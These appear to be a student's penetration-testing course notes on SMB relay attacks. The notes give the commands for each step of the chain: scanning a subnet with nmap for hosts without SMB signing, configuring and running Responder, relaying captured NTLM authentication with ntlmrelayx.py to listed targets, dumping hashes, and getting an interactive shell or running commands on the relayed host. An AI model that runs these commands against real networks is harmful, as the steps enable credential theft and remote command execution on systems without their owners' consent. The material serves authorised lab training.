SMB Relay Attacks Overview

Sunday, October 1, 2023

6:36 PM

![](005_SMB_Relay_Attacks_Overview_000.png){width="8.010416666666666in" height="5.84375in"}

 

 

![](005_SMB_Relay_Attacks_Overview_001.png){width="12.78125in" height="7.270833333333333in"}

Nmap script for identifying hosts without SMB signing example: nmap \--script=smb2-security-mode.nse -p445 10.0.2.0/24 -Pn

\*-Pn not required but can be very helpful if machine not responding but we know it\'s there.\*

 

 

![](005_SMB_Relay_Attacks_Overview_002.png){width="14.666666666666666in" height="4.59375in"}

Once host discovered where SMB signing is disabled or not enforced must modify responder to work correctly with relay example: sudo mousepad /usr/share/responder/Responder.conf

 

Then Run Responder

Sudo responder -I eth0 -dwPv

![](005_SMB_Relay_Attacks_Overview_003.png){width="13.84375in" height="7.708333333333333in"}

 

 

Set up relay sudo ntlmrelayx.py -tf targets.txt -smb2support

Create file with Ips of targets you\'ve identified as vulnerable

![](005_SMB_Relay_Attacks_Overview_004.png){width="9.822916666666666in" height="7.40625in"}

 

When an event occurs responder will forward to relay and ntlm relay forwards to target selected

![](005_SMB_Relay_Attacks_Overview_005.png){width="11.15625in" height="7.28125in"}

 

![](005_SMB_Relay_Attacks_Overview_006.png){width="12.854166666666666in" height="6.25in"}

Hash dump quick win

 

![](005_SMB_Relay_Attacks_Overview_007.png){width="12.53125in" height="5.5625in"}

-I at end opens interactive shell

-   NC 127.0.0.1 11001

    -   Course originally called for port 11000 but wouldn\'t work, so try different ports.

    -   Remember not to look for FAILED necessarily but shell

> ![](005_SMB_Relay_Attacks_Overview_008.png){width="8.1875in" height="7.3125in"}
>
>  
>
>  

Can also run Commands -c \"whoami\"

![](005_SMB_Relay_Attacks_Overview_009.png){width="13.791666666666666in" height="6.020833333333333in"}

 
